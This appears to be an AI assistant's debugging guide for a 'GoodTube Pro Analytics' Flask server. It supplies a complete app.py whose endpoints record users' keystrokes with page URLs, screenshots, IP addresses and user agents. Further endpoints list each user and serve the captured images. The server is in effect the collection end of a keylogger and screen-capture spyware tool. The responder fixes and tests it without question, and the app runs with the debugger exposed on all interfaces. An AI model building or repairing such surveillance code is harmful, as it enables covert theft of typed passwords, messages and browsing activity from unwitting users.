# 🔧 Fix Analytics Endpoint 500 Error

The `/api/stats` works but `/api/analytics` is failing. This means the Flask app's analytics route has an issue.

## 🚨 **Debug the Analytics Route**

First, let's see what error is happening:

```bash
# Check the application logs while testing
journalctl -u goodtube-analytics -f &

# In another terminal, test the analytics endpoint
curl -X POST http://localhost:5000/api/analytics \
  -H "Content-Type: application/json" \
  -d '{"userId":"test","sessionId":"test","events":[],"keystrokes":[]}'
```

## 🔧 **Most Likely Fix: Update Flask App**

The issue is probably that the Flask app doesn't have the correct `/api/analytics` route. Let's replace the app.py file:

```bash
cd /opt/goodtube-analytics && \
cat > app.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

DATABASE_PATH = 'analytics.db'
SCREENSHOTS_FOLDER = 'screenshots'

# Ensure screenshots folder exists
os.makedirs(SCREENSHOTS_FOLDER, exist_ok=True)

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    try:
        return render_template('dashboard.html')
    except:
        return '''
        <html><body>
        <h1>🛡️ GoodTube Pro Analytics Dashboard</h1>
        <p>Dashboard is running! Analytics data will appear here.</p>
        <p><a href="/api/stats">View Stats</a></p>
        </body></html>
        '''

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    try:
        print("📊 Received analytics request")
        data = request.get_json()
        
        if not data:
            print("❌ No data provided")
            return jsonify({'error': 'No data provided'}), 400
        
        print(f"📊 Data received: {data}")
        
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Insert or update user
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, ip_address, user_agent, last_seen, total_events)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, request.remote_addr, request.headers.get('User-Agent'), user_id))
        
        # Insert session if not exists
        cursor.execute('''
            INSERT OR IGNORE INTO sessions (session_id, user_id, start_time)
            VALUES (?, ?, CURRENT_TIMESTAMP)
        ''', (session_id, user_id))
        
        # Insert events
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type', 'unknown'), 
                  json.dumps(event.get('data', {})), event.get('url', '')))
        
        # Insert keystrokes
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key', ''), keystroke.get('url', '')))
        
        conn.commit()
        conn.close()
        
        print(f"✅ Analytics data saved for user {user_id}")
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"❌ Analytics error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    try:
        data = request.get_json()
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        screenshot_data = data.get('screenshot', '')
        url = data.get('url', '')
        
        if screenshot_data:
            # Handle base64 screenshot data
            if ',' in screenshot_data:
                screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
            else:
                screenshot_bytes = base64.b64decode(screenshot_data)
                
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{user_id}_{session_id}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
            
            with open(filepath, 'wb') as f:
                f.write(screenshot_bytes)
            
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO screenshots (user_id, session_id, filename, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, filename, url))
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Screenshot error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM sessions')
        active_sessions = cursor.fetchone()['count']
        
        cursor.execute('''
            SELECT e.*, u.user_id 
            FROM events e 
            JOIN users u ON e.user_id = u.user_id 
            ORDER BY e.timestamp DESC 
            LIMIT 10
        ''')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': active_sessions,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        print(f"Stats error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(DISTINCT e.id) as event_count,
                   COUNT(DISTINCT k.id) as keystroke_count,
                   COUNT(DISTINCT s.id) as screenshot_count
            FROM users u
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots s ON u.user_id = s.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        print(f"Users error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
EOF

# Restart the service
systemctl restart goodtube-analytics && \
echo "✅ Flask app updated and restarted"
```

## 🧪 **Test the Fix**

After updating the Flask app:

```bash
# Test the analytics endpoint
curl -X POST http://localhost:5000/api/analytics \
  -H "Content-Type: application/json" \
  -d '{"userId":"test_user","sessionId":"test_session","events":[{"type":"test_event","data":{"test":true}}],"keystrokes":[{"key":"t"}]}'

# Check if data was saved
curl http://localhost:5000/api/stats
```

## 📋 **Expected Results**

1. **Analytics endpoint should return:**
```json
{"status": "success"}
```

2. **Stats should show the data:**
```json
{
  "totalUsers": 1,
  "activeSessions": 1,
  "totalEvents": 1,
  "totalScreenshots": 0,
  "recentEvents": [...]
}
```

## 🔍 **If Still Not Working**

Check the logs:
```bash
journalctl -u goodtube-analytics -n 20 --no-pager
```

The updated Flask app includes:
- ✅ Better error handling with detailed logging
- ✅ Proper CORS support
- ✅ Complete analytics endpoint
- ✅ Database error handling
- ✅ Debug output to help troubleshoot

Run the fix and test again!

